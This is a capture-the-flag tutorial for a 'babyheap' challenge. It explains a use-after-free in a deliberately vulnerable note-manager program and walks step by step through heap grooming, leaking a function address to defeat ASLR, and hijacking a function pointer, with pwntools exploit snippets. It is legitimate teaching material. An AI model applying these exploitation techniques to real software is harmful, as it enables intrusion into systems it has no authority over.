
# babyheap

Welcome to babyheap. This challenge serves as a tutorial to teach you the
basics of binary heap exploitation. The challenge uses a custom heap
implementation that keeps the allocator's behaviour easy to observe. You do not
need to read the implementation or understand it fully it order to be able to
solve the challenge, however you are encouraged to study it for its pedagogical
value.

This guide serves as a detailed walk-through for the challenge. You may like to
try to solve it first without reading through the guide.

## What's a heap?

If you have dabbled in C programming before, you might be familiar with
`malloc` and its variants: functions related to so-called _dynamic memory
allocation_. When a program needs space to place data, and the size of the data
is not known at compile time, it is useful to have a mechanism by which it can
ask the system for memory in which to place that data.

The mechanism is called an allocator, and the memory it manages for the program
is called the heap.

For this challenge, a custom heap implementation has been given. It lacks much
of the hardening and optimisation of a fully fledged production allocator, but
should be easy to conceptualise in order to understand some of the common
heap-related vulnerability classes.

## Heap vulnerability classes

Some broad vulnerability classes related to heap-allocated data are:

- Heap overflows: Data from one allocation can overflow into a contiguous
allocation, potentially corrupting either allocator metadata or object metadata
specific to the program's logic.
- Use-after-free: After an allocation is released back to the allocator, the
program continues to read from or write to it. If the freed allocation is
reused for an object of a different type, this can lead to type confusion: an
object of type A being used with type B semantics.
- Double free: After being freed, an allocation is freed again. If the
allocator has a system for caching freed allocations, then freeing an
allocation twice can lead to side effects such as a single allocation being
returned twice and used for objects of different kinds.

## Playing this challenge

This challenge consists of:

- `babyheap.c`: a simple custom heap implementation.
- `chall.c`: the source for the `notemanager` target binary. There are bugs in
this program, and your objective is to exploit them.
- `babyheap_gdb.py`: a GDB command that visualises the heap while the program
is running.

Start by looking for bugs in the `chall.c` source code. You should be looking
for issues similar to those described above; ways in which allocations can be
overflowed, used after they are freed, freed twice, or otherwise made to
violate the implicit contract between a program and its allocator.

Once you have found the bugs, your task will be to think about how to leverage
them to achieve a useful effect. Ultimately, that effect needs to be sufficient
to let you access the flag on the underlying system.

## Looking for bugs in the code

`notemanager` is a program that conforms to the structure of a common binary
exploitation challenge format: heap note. This challenge format typically
supports operations on heap data that allow for Create/Read/Update/Delete
(CRUD) style actions. 

Start by reading the source code and understanding why the program allows you
to do.

`notemanager` lets us:
- create a note: allocate memory for a note and its text, and store the note in
a global array
- show a note: use the note's `printer` function to either print a note title,
or the full note text
- toggle a note: toggle the note printer between title printing and full
printing
- delete a note: free the note and its text, releasing the allocation back to
the allocator.

Take a moment now to understand the program's behaviour completely, then look
for a bug. Below, I will list some hints that you can use if you get stuck.


### Hint 1. Is `delete_note` correctly implemented? What could be missing?


### Hint 2. `delete_note` frees a note, but does not delete the reference to
that note from the `note_store`. Why is this a dangerous bug?


### Bug explanation 
The bug is more or less completely revealed in hint 2, but
here we will explain why this mistake constitutes a dangerous security
vulnerability. The dangling references to notes left behind by `delete_note` is
called a Use-after-free. Because the references to free memory remain, it might
allow an attacker to use memory that has be freed from semantic context A, and
reallocated to be used in semantic context B, with the original context A
semantics. 

In the case of this program, it means that we could for example reclaim an old
`note_t` allocation with an allocation used for `char *text`. 

What could go wrong if the body of a note was overwritten with arbitrary data
controlled by the user? Achieving this sort of state is often referred to as
'establishing a primitive'. If we can 'confuse' two semantic contexts, we have
broken out of the program's canonical state machine and the task is then to
determine what additional 'weird states' we have (our primitives) and how we
can use them to achieve the primitives required to, in the case, capture the
flag. 

Let's start by achieving the primitive, then we will discuss how we might use
them to complete the challenge.

Build the challenge (`make`) and load the visualiser with:

```console 
$ gdb ./notemanager 
(gdb) source babyheap_gdb.py 
(gdb) start 
< Ctrl-C to break>
(gdb) babyheap 
```


## Understanding the allocator

Before arranging an overlap, we need to understand one important property of
`babyheap`: allocations of different sizes are kept in different size classes.
The available chunk sizes are 16, 32, 64, 128, 256, 512, 1024, 2048 and 4096
bytes. When `malloc` receives a request, it uses the smallest class large enough
to satisfy it.

Within a class, the allocator scans its bitmap from the beginning and returns
the first free chunk. This makes reuse deterministic. If chunks zero and one
are freed, the next two allocations in that size class will receive chunks zero
and one, in that order.

Now consider the allocations made by `create_note`:

```c
note_t *note = malloc(sizeof *note);
char *title = malloc(NOTE_TITLE_LEN + 1);
/* ... */
char *text = malloc(len + 1);
```

On this 64-bit target, `note_t` contains three eight-byte pointers and is
therefore 24 bytes:

```text
offset  size  field
0x00      8   title
0x08      8   text
0x10      8   printer
```

You can confirm this in GDB with `p sizeof(note_t)`. A 24-byte request is
served by the 32-byte class. A title always requests 33 bytes and is served by
the 64-byte class. The class used for a note's text depends on the length we
choose.

This gives us a useful question to answer before continuing:

> What note length will cause its text allocation to use the same 32-byte size
> class as a `note_t`?

Remember that the program allocates one extra byte for the terminating null
byte. A requested note length of 24 causes `malloc(25)`, which fits in a
32-byte chunk. This means that a short note's text can reclaim the allocation
which previously held a `note_t`.

The following table summarises the two lengths used by the solution:

| Purpose | User-supplied length | Allocation request | Chunk class |
| --- | ---: | ---: | ---: |
| `note_t` object | n/a | 24 | 32 |
| title | at most 32 | 33 | 64 |
| short text | 24 | 25 | 32 |
| long text | 256 | 257 | 512 |

The long notes are useful for heap grooming because their text allocations
cannot consume a freed `note_t` chunk. Only their 24-byte `note_t` allocations
use the 32-byte class.

## Watching the heap change

Create three notes, numbered 0, 1 and 2. Give them the titles `A`, `B` and `C`,
and request a length of 256 for each. The actual text may be shorter while you
are experimenting manually; it is the requested length which determines the
allocation size.

Interrupt the program with Ctrl-C once it has returned to the menu, then ask
the visualiser to show class 1, the 32-byte class:

```console
(gdb) babyheap class 1 nocolor
class[1]  chunk=32 B   slabs=1   chunks 3/2038 used (0%)
  slab @ 0x...   2038 chunks  used 3  free 2035  data@+0x130
    [###.............................................................]  0..63
    ...

  legend: # used   . free
```

Each `#` represents an allocated chunk and each `.` represents a free chunk.
The first three chunks contain the three `note_t` objects. If you inspect the
64- and 512-byte classes with `babyheap class 2` and `babyheap class 5`, you
will see three used chunks in each of those classes as well: the titles and
texts respectively.

Continue the program and delete notes 0 and 1. The visualiser will now show the
start of the 32-byte bitmap as `..#`. Chunk two still belongs to note 2, while
chunks zero and one have been returned to the allocator.

The crucial state is not visible in the bitmap. Although those
chunks are free, `note_store[0]` and `note_store[1]` still hold their addresses.
The allocator knows that the chunks are free; the application incorrectly
believes that they are still notes. You can see the dangling pointers with:

```console
(gdb) p/x note_store[0]
(gdb) p/x note_store[1]
```

This 'dangling' reference to memory chunks that have been freed is what we will
make use of.

## Reclaiming a freed note

Create note 3 with the title `D`, a length of 24, and exactly 24 `D` characters
as its text. Follow the allocation order carefully:

1. The new `note_t` requests 24 bytes. It reclaims chunk zero of the 32-byte
   class, where note 0 used to live.
2. The title requests 33 bytes and comes from the separate 64-byte class.
3. The text requests 25 bytes. It reclaims chunk one of the 32-byte class,
   where note 1 used to live.

The important pointers now alias each other:

```text
note_store[0] ──────────────┐
                            v
32-byte chunk 0: [ note 3's title | note 3's text | print_full_note ]
                                             |
                                             v
note_store[1] ─────> 32-byte chunk 1: [ DDDDDDDD | DDDDDDDD | DDDDDDDD ]
                                             ^
                                             |
                                  note_store[3]->text
```

In GDB, addresses will vary, but the relationships should look like this:

```console
(gdb) p/x note_store[0]
$1 = 0x...130
(gdb) p/x note_store[1]
$2 = 0x...150
(gdb) p/x note_store[3]
$3 = 0x...130
(gdb) p/x note_store[3]->text
$4 = 0x...150
```

Notice that `babyheap class 1` once again begins with `###`. From the
allocator's perspective everything is valid: three chunks are allocated. The
vulnerability exists at the application layer because the chunks have changed
owners and types while stale references remain. 

If the bytes in note 3's text are interpreted through `note_store[1]`, they
look like a fake `note_t`:

```console
(gdb) x/3gx note_store[1]
0x...150:  0x4444444444444444  0x4444444444444444
0x...160:  0x4444444444444444
```

The first eight `D`s are interpreted as a title pointer, the next eight as a
text pointer, and the final eight as a function pointer. Showing note 1 now
would attempt to call `0x4444444444444444` and crash. We have achieved type
confusion, but still need to turn it into a useful primitive.

Take a moment here to think about how we can use the behaviour of the program 
to turn this type confusion into something useful. Our goal is ultimately to 
call the function `win` which will read the flag file for us. What intermediate 
steps do we need to achieve in order to achieve this?

Working backwards: There is no way to call `win` canonically in the program.
This means we might need to identify a way to call an arbitrary value, or
to corrupt data to call something unintended. A good instinct in this position
is to look for a way to leak address information of functions in the program.
The binary is "position independent", which means that the program will be 
loaded at a random, different base address each time it is invoked. However,
the relative positions of functions within the program text will always remain
the same. This means that if we can leak the address of anything in the
program's text, it will reveal the address of all other functions.
Can you find a way to achieve this using the primitive we established above?




## Using `toggle_note`

Take a look at `toggle_note`. This function can write a function pointer into
the body of a note. With the above 'use-after-free' primitive we established,
with both a `note_t` and a `text` using a single allocation, we could use
`toggle_note` to write the address of a function in the program into the text
of a note. 

By toggling the dangling note 1, then viewing note 3, we can get a 'leak'.


Inspect the reclaimed chunk again:

```console
(gdb) x/3gx note_store[1]
0x...150:  0x4444444444444444  0x4444444444444444
0x...160:  0x000055..........
```

The third field should now match `&print_note_title`. 

Viewing the note through the program will leak us the raw bytes representing 
the address of a function. 


## Recovering the address of the win function.

Note 3 itself is still a valid `note_t` in chunk zero. Its `text` field points
to chunk one, so showing note 3 calls `print_full_note` on a real note and then
prints our overlapped bytes with `%s`.

The text originally contained 24 `D`s. Toggling dangling note 1 replaced the
last eight with the address of `print_note_title`, so showing note 3 produces
the following byte sequence in its body:

```text
DDDDDDDDDDDDDDDD + packed address of print_note_title
```

The pointer is printed as raw characters and will look like garbage in a
terminal. We should collect it with a script instead. 

```python
show_note(3)

p.recvuntil(b"D" * 16)
leak = u64(p.recvn(6).ljust(8, b"\x00"))
log.info(f"leaked print_note_title: {leak:#x}")
```

This leaks a runtime address from the position-independent executable. ASLR
changes the address at which the executable is loaded, but it does not change
the distance between functions within that executable. We can therefore find
`win` by adding the symbol offset difference:

```python
win = leak + (e.sym.win - e.sym.print_note_title)
log.info(f"resolved win: {win:#x}")
```


## Building the final fake note

We will repeat the same heap-grooming pattern. Create three more long notes,
which receive indices 4, 5 and 6. Their `note_t` objects occupy the next three
32-byte chunks. Delete notes 4 and 5, leaving their object chunks free while
their entries in `note_store` remain dangling.

At this point, the beginning of the 32-byte class has the following ownership:

```text
chunk 0  note 3 object       allocated
chunk 1  note 3 text         allocated
chunk 2  note 2 object       allocated
chunk 3  old note 4 object   free
chunk 4  old note 5 object   free
chunk 5  note 6 object       allocated
```

Now create note 7 with a 24-byte text. Its `note_t` takes free chunk three and
its 25-byte text allocation takes free chunk four. Consequently,
`note_store[5]` points to note 7's attacker-controlled text.

This time, choose the text bytes so that they form the following fake object:

```text
offset  fake field  supplied bytes
0x00    title       W * 8
0x08    text        W * 8
0x10    printer     p64(win)
```

In pwntools, the complete 24-byte payload is:

```python
payload = b"W" * 16 + p64(win)
new_note(b"win", 24, payload)
```

`read_string` accepts embedded null bytes, so the packed pointer can be sent
directly even though it is not printable text. The fake title and text pointers
are deliberately invalid, but that does not matter: `show_note` only reads the
fake `printer` field before making the indirect call, and `win` does not use
the note argument.

Finally, show dangling note 5:

```python
show_note(5)
```

The statement `n->printer(n)` fetches `win` from offset `0x10` of our payload
and calls it. Under the x86-64 calling convention the extra `n` argument is
harmless; `win` ignores it and executes `/bin/cat flag.txt`.

## Developing the exploit with pwntools

It is useful to automate menu interactions early. Apart from making the final
exploit usable against the remote service, this makes heap grooming repeatable:
one missed menu prompt or different allocation length would otherwise change
the heap state.

Start with these wrappers:

```python
#!/usr/bin/env python3
from pwn import *

e = context.binary = ELF("./notemanager")
p = process(e.path)

gdb.attach(p,'source ./babyheap_gdb.py')

def sla(delim, data):
    if not isinstance(data, bytes):
        data = str(data).encode()
    p.sendlineafter(delim, data)


def new_note(title, length, text):
    sla(b">", 1)
    sla(b"Note title:", title)
    sla(b"Note length:", length)
    sla(b"Note text:", text)


def show_note(idx):
    sla(b">", 2)
    sla(b"Note to display: ", idx)


def toggle_note(idx):
    sla(b">", 3)
    sla(b"Note to toggle: ", idx)


def delete_note(idx):
    sla(b">", 4)
    sla(b"Note to delete: ", idx)
```



Try to assemble the two stages yourself before expanding the complete exploit
below. The important invariants to check are:

- after the first short allocation, `note_store[1] == note_store[3]->text`;
- toggling note 1 places `print_note_title` after 16 marker bytes;
- the leaked address is converted from little-endian bytes to an integer;
- after the second short allocation, `note_store[5] == note_store[7]->text`;
- the packed `win` address begins at offset 16 of the final payload.

The purpose of this challenge is to give you a 'playground' to experiment with
a classic use-after-free vulnerability that yields a PC-control primitive. 
You are encouraged to play around with it and develop your own working exploit
using the snippets above. You may need to perform your own research into how
to use the `pwntools` python library. 

Once you have an exploit working locally, use `pwntools` `remote` method to 
connect to the remote challenge instance and retrieve the flag. 

Feel free to ask skateboarding dog members for help writing your exploit. 

Once you have completed this challenge, have a go at completing
its successor: all-grown-up-heap! 
